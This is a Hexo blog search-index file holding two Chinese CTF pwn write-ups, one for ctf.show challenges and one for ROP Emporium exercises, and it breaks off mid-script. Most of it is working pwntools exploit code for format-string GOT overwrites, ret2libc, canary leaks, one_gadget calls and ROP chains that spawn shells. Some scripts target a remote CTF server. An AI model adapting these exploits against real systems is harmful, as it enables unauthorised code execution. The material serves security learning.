<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF-36D-PWN-WP</title>
    <url>/2020/05/07/CTF-36D-PWN-WP/</url>
    <content><![CDATA[<p>感谢1p0ch师傅</p>
<p>最近参加了ctf.show举办的一个比赛，做了一下pwn题，以下是我的一些wp，由于本人能力有限，菜的一批，如果有什么不对的地方，请多包含。</p>
<a id="more"></a>

<h3 id="PWN-签到"><a href="#PWN-签到" class="headerlink" title="PWN_签到"></a>PWN_签到</h3><p>签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more&lt;flag               这里&lt;可以绕过空格</span><br></pre></td></tr></table></figure>

<h3 id="PWN-babyFmtstr"><a href="#PWN-babyFmtstr" class="headerlink" title="PWN_babyFmtstr"></a>PWN_babyFmtstr</h3><p>格式化字符串漏洞，我们可以修改got表，这样就有一个无限格式化字符串漏洞的程序了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28028)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">memset_addr&#x3D;elf.got[&#39;memset&#39;]</span><br><span class="line">#0x0400AA0</span><br><span class="line">payload1&#x3D;&#39;%64c%11$hn%2656c%12$hnAA&#39;+p64(memset_addr+2)+p64(memset_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA%9$s&#39;+p64(puts_got)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input name:\n&#39;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(&#39;Hello AAAA&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print  (&#39;puts_addr:&#39; +hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base&#x3D;puts_addr-libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print(&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">def set_printf_to_system(system):</span><br><span class="line">	printf_got_addr&#x3D;printf_got</span><br><span class="line">	x &#x3D; system &amp; 0xffffffff</span><br><span class="line">	a &#x3D; x &amp; 0xffff</span><br><span class="line">	a1 &#x3D; printf_got_addr</span><br><span class="line">	b &#x3D; (x&gt;&gt;16) &amp; 0xffff</span><br><span class="line">	b1&#x3D;printf_got_addr+2</span><br><span class="line">	if(a&gt;b):</span><br><span class="line">		tmp&#x3D;a</span><br><span class="line">		a&#x3D;b</span><br><span class="line">		b&#x3D;tmp</span><br><span class="line">		tmp&#x3D;a1</span><br><span class="line">		a1&#x3D;b1</span><br><span class="line">		b1&#x3D;tmp</span><br><span class="line">	s&#x3D;&quot;%&quot;+str(a)+&quot;c&quot;</span><br><span class="line">	s+&#x3D;&quot;%12$hn&quot;</span><br><span class="line">	s+&#x3D;&quot;%&quot;+str(b-a)+&quot;c&quot;</span><br><span class="line">	s+&#x3D;&quot;%13$hn&quot;</span><br><span class="line">	for i in range(32-len(s)):</span><br><span class="line">		s+&#x3D;&#39;a&#39;</span><br><span class="line">	s+&#x3D;p64(a1)</span><br><span class="line">	s+&#x3D;p64(b1)</span><br><span class="line">	return s</span><br><span class="line"></span><br><span class="line">payload3&#x3D;set_printf_to_system(system_addr)</span><br><span class="line">print (str(payload3))</span><br><span class="line">#gdb,attach(sh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">payload4&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-MagicString"><a href="#PWN-MagicString" class="headerlink" title="PWN_MagicString"></a>PWN_MagicString</h3><p>程序中没有参数，传入/bin/sh\x00，就可以getshell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28095)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">gets_plt&#x3D;elf.plt[&#39;gets&#39;]</span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line">pop_rdi&#x3D;0x0000000000400733</span><br><span class="line">bss_addr&#x3D;0x601080</span><br><span class="line">main_addr&#x3D;0x0000000000400661</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x2a0+&#39;a&#39;*8+p64(pop_rdi)+p64(bss_addr)+p64(gets_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">payload2&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x2a0+&#39;a&#39;*8+p64(pop_rdi)+p64(bss_addr)+p64(system_plt)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-MengxinStack"><a href="#PWN-MengxinStack" class="headerlink" title="PWN_MengxinStack"></a>PWN_MengxinStack</h3><p>程序开启了canary，pie，首先我们泄露canary，然后覆盖返回地址的最后一个字节，让程序可以重新执行，之后再泄露libc，最后one_gadget就可以getshell了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28090)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;A&#39;*0x29</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(&#39;A&#39;*0x28)</span><br><span class="line">canary&#x3D;u64(sh.recv(8))-0x41</span><br><span class="line">print (&#39;canary:&#39; +hex(canary))</span><br><span class="line">ret_addr&#x3D;0xffffffffff600400</span><br><span class="line">ret&#x3D;0xffffffffff600409</span><br><span class="line">#0x0000000000000a62</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x28+p64(canary)+&#39;a&#39;*0x18+&#39;\x04&#39;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x28+&#39;a&#39;*0x8+&#39;a&#39;*0x18</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sh.recvuntil(&#39;a&#39;*0x48)</span><br><span class="line">libc_main_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-240</span><br><span class="line">print (&#39;libc_main_addr:&#39; +hex(libc_main_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;__libc_start_main&#39;,libc_main_addr)</span><br><span class="line">libc_base&#x3D;libc_main_addr-libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">#0x45216</span><br><span class="line">one_gedget&#x3D;libc_base+0x45216</span><br><span class="line">payload4&#x3D;&#39;a&#39;*0x28+p64(canary)+&#39;a&#39;*0x18+p64(one_gedget)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="PWN-tang"><a href="#PWN-tang" class="headerlink" title="PWN_tang"></a>PWN_tang</h3><p>和上一道题利用思路一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#coding &#x3D;&#39;utf-8&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&#39;124.156.121.112&#39;,28006)</span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn6&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn6&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;%9$p&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&#39;\x0a&#39;)</span><br><span class="line">canary&#x3D;int(sh.recv(18),16)</span><br><span class="line">print(&#39;canary:&#39; +hex(canary))</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x38+p64(canary)+&#39;a&#39;*0x18+&#39;\x08&#39;  </span><br><span class="line">这里覆盖返回地址最后一个字节的时候有错误，调试了半天也没弄明白，本来应该是\x10的，但是我发现\x08可以重新执行程序，\x10就不可以.哪位大佬如果知道可以指点一下。</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload3)</span><br><span class="line"></span><br><span class="line">payload4&#x3D;&#39;%7$p&#39;</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&#39;\x9f\x0a&#39;)</span><br><span class="line">sh.send(payload4)</span><br><span class="line">setvbuf_addr&#x3D;int(sh.recv(14),16)-324</span><br><span class="line">print(&#39;setvbuf:&#39; +hex(setvbuf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;setvbuf&#39;,setvbuf_addr)</span><br><span class="line">libc_base&#x3D;setvbuf_addr-libc.dump(&#39;setvbuf&#39;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">#0xf1147</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line">payload5&#x3D;&#39;a&#39;*0x38+p64(canary)+&#39;a&#39;*0x18+p64(one_gadget)</span><br><span class="line">sh.send(payload5)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>CTF Game</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Rop_Emporium</title>
    <url>/2020/05/07/Rop-Emporium/</url>
    <content><![CDATA[<h2 id="Rop-Emporium"><a href="#Rop-Emporium" class="headerlink" title="Rop   Emporium"></a>Rop   Emporium</h2><p>最近在学习ROP，发现ROP Emporium这个网站上题目挺好，就一直在做，我这里用到查gadget的工具是ROPgadget，其他工具也是可以的。</p>
<a id="more"></a>

<h3 id="ret2win-32"><a href="#ret2win-32" class="headerlink" title="ret2win_32"></a>ret2win_32</h3><p>简单的覆盖返回地址跳转到后门函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+&quot;\x59\x86\x04\x08&quot;</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ret2win-64"><a href="#ret2win-64" class="headerlink" title="ret2win_64"></a>ret2win_64</h3><p>和32位一样，覆盖返回地址跳转到后门函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*8+p64(0x0400811)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="split-32"><a href="#split-32" class="headerlink" title="split_32"></a>split_32</h3><p>程序的system中不是/bin/sh，通过查找字符串发现在数据段，将参数数据段参数传递给system就ok了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+p32(0x08048657)+p32(0x0804a030)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="split-64"><a href="#split-64" class="headerlink" title="split_64"></a>split_64</h3><p>64位和32位有点不一样，在传参方面64位前几个参数是放在rdi，rsi，rdx，rcx，r8,r9中，所以需要将参数放到rdi中才可以调用成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split&quot;)</span><br><span class="line">system_addr&#x3D;0x0400810</span><br><span class="line">rdi_addr&#x3D;0x0400883</span><br><span class="line">flag_addr&#x3D;0x0601060</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*0x8+p64(rdi_addr)+p64(flag_addr)+p64(system_addr)</span><br><span class="line">#当程序ret时，进入rdi_addr，然后rdi再ret到system_addr每一次esp指向都不一样</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="callme-32"><a href="#callme-32" class="headerlink" title="callme_32"></a>callme_32</h3><p>程序中没有system和/bin/sh,给了一个.so文件，用IDA查看发现程序通过callme_one函数将flag文件导入,通过callme_two和callme_three函数将flag解密输出,这三个函数还需要在0x1,0x2,0x3这三个参数，由于.so文件相当于在调用动态链接库，没有办法esp自减，所以我们利用程序中的gadget来平衡一下栈 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme32&quot;)</span><br><span class="line">callme_one_addr&#x3D;0x080485c0</span><br><span class="line">callme_two_addr&#x3D;0x08048620</span><br><span class="line">callme_three_addr&#x3D;0x080485b0</span><br><span class="line">gadget_addr&#x3D;0x080488a9</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(callme_one_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_two_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_three_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="callme-64"><a href="#callme-64" class="headerlink" title="callme_64"></a>callme_64</h3><p>和32基本一样，注意传参问题就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme&quot;)</span><br><span class="line">gadget_addr&#x3D;0x0401ab0</span><br><span class="line">callme_one_addr&#x3D;0x0401850</span><br><span class="line">callme_two_addr&#x3D;0x0401870</span><br><span class="line">callme_three_addr&#x3D;0x0401810</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_one_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_two_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_three_addr)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="write4-32"><a href="#write4-32" class="headerlink" title="write4_32"></a>write4_32</h3><p>程序中只有system函数，没有我们需要的/bin/sh，需要我们自己构造，但是我们要向将自己构造的写入到程序，就要知道程序bss段或者data段是否可写，以及他们的空间是否足够。另外需要注意的是，我们这里是 32 位程序，每次只能写入 4 个字节，所以要分成两次写入，还得注意字符对齐，有没有截断字符（ \x00  , \x0a  等）之类的问<br>题，比如这里  /bin/sh  只有七个字节，我们可以使用  /bin/sh\x00  或者/bin//sh </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write432&quot;)</span><br><span class="line">system_addr&#x3D;0x0804865a           #system_plt_addr&#x3D;0x08048430</span><br><span class="line">pop_pop_addr&#x3D;0x080486da</span><br><span class="line">mov_addr&#x3D;0x08048670</span><br><span class="line">data_addr&#x3D;0x0804a028</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr)+&quot;&#x2F;bin&quot;+p32(mov_addr)</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;&#x2F;sh&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">#payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;sh\x00&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p32(system_addr)+p32(data_addr)         #p32(system_plt_addr)   </span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="write4-64"><a href="#write4-64" class="headerlink" title="write4_64"></a>write4_64</h3><p>64位一次写入就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write4&quot;)</span><br><span class="line">system_plt_addr&#x3D;0x04005e0</span><br><span class="line">data_addr&#x3D;0x0601050</span><br><span class="line">mov_ret_addr&#x3D;0x0400820</span><br><span class="line">pop_pop_addr&#x3D;0x0400890</span><br><span class="line">pop_rdi_addr&#x3D;0x0400893</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(pop_pop_addr)+p64(data_addr)+&quot;&#x2F;bin&#x2F;sh\x00&quot;+p64(mov_ret_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(data_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="badchars-32"><a href="#badchars-32" class="headerlink" title="badchars_32"></a>badchars_32</h3><p>我们依然要将  /bin/sh  写入到进程内存中，但这一次程序在读取，输入时会对敏感字符进行检查。处理敏感字符在利用开发中是经常要用到的，不仅仅是要对参数进行编码，有时甚至地址也要如此。这里我们使用简单的异或操作来对字符串编码和解码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars32"</span>)</span><br><span class="line"></span><br><span class="line">pop_ebx_ecx_addr=<span class="number">0x08048896</span></span><br><span class="line">pop_esi_edi_addr=<span class="number">0x08048899</span></span><br><span class="line">mov_edi_esi_addr=<span class="number">0x08048893</span></span><br><span class="line">xor_addr=<span class="number">0x08048890</span></span><br><span class="line">system_plt_addr=<span class="number">0x080484e0</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line">binsh=<span class="string">""</span></span><br><span class="line">xor_byte=<span class="number">0x2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">	c=ord(i) ^ xor_byte</span><br><span class="line">	binsh+=chr(c)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">0</span>:<span class="number">4</span>]+p32(bss_addr)+p32(mov_edi_esi_addr)</span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">4</span>:<span class="number">8</span>]+p32(bss_addr+<span class="number">4</span>)+p32(mov_edi_esi_addr)</span><br><span class="line"><span class="comment">#code</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p32(pop_ebx_ecx_addr)</span><br><span class="line">	payload+=p32(bss_addr+i)</span><br><span class="line">	payload+=p32(xor_byte)</span><br><span class="line">	payload+=p32(xor_addr)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+<span class="string">"a"</span>*<span class="number">0x4</span>+p32(bss_addr)</span><br><span class="line">	</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="badchars-64"><a href="#badchars-64" class="headerlink" title="badchars_64"></a>badchars_64</h3><p>和32位一样，就是这次可以一次传参了，需要注意的就是传参问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./badchars'</span>)</span><br><span class="line">system_plt_addr=<span class="number">0x004006f0</span></span><br><span class="line">bss_addr=<span class="number">0x0000000000601080</span>			//本来想用data段的，但是不知道为什么data段地址就是不对，服服服。。。</span><br><span class="line">mov_r13_r12_addr=<span class="number">0x0400b34</span></span><br><span class="line">pop_r12_r13_addr=<span class="number">0x0400b3b</span></span><br><span class="line">pop_r14_r15_addr=<span class="number">0x0400b40</span></span><br><span class="line">xor_r15_r14_addr=<span class="number">0x0400b30</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x0400b39</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_byte=<span class="number">0x1</span></span><br><span class="line">badchars=[<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x2f</span>,<span class="number">0x20</span>,<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	binsh=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">		c=ord(i) ^ xor_byte</span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> badchars:</span><br><span class="line">			xor_byte+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			binsh+=chr(c)</span><br><span class="line">	<span class="keyword">if</span> len(binsh)==<span class="number">8</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x20</span>+<span class="string">"a"</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_r12_r13_addr)+binsh+p64(bss_addr)+p64(mov_r13_r12_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p64(pop_r14_r15_addr)</span><br><span class="line">	payload+=p64(xor_byte)</span><br><span class="line">	payload+=p64(bss_addr+i)</span><br><span class="line">	payload+=p64(xor_r15_r14_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fluff-32"><a href="#fluff-32" class="headerlink" title="fluff_32"></a>fluff_32</h3><p>和前面的一样但是程序这次的gadget确实有点难利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./fluff32"</span>)</span><br><span class="line"></span><br><span class="line">system_plt_addr=<span class="number">0x08048430</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line">mov_edx_addr=<span class="number">0x0804868c</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080483e1</span></span><br><span class="line">xor_edx_ebx=<span class="number">0x0804867b</span></span><br><span class="line">xchg_edx_ecx=<span class="number">0x08048689</span></span><br><span class="line">mov_ecx_edx=<span class="number">0x08048693</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx                   ##先将程序通过异或来放到edx中，然后在解密放到ecx中</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data-&gt;edx                           #先将程序通过异或来放到edx中，然后再把edx中的解密</span></span><br><span class="line"></span><br><span class="line">payload+=p32(pop_ebx_addr)                     </span><br><span class="line">payload+=<span class="string">"/bin"</span></span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(mov_ecx_edx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr-&gt;ecx							#和上面一样，32位需要俩次才能把参数传完</span></span><br><span class="line"></span><br><span class="line">payload+=p32(mov_edx_addr)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)</span><br><span class="line">payload+=p32(<span class="number">0xdefaced0</span>)</span><br><span class="line">payload+=p32(xor_edx_ebx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(xchg_edx_ecx)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line"><span 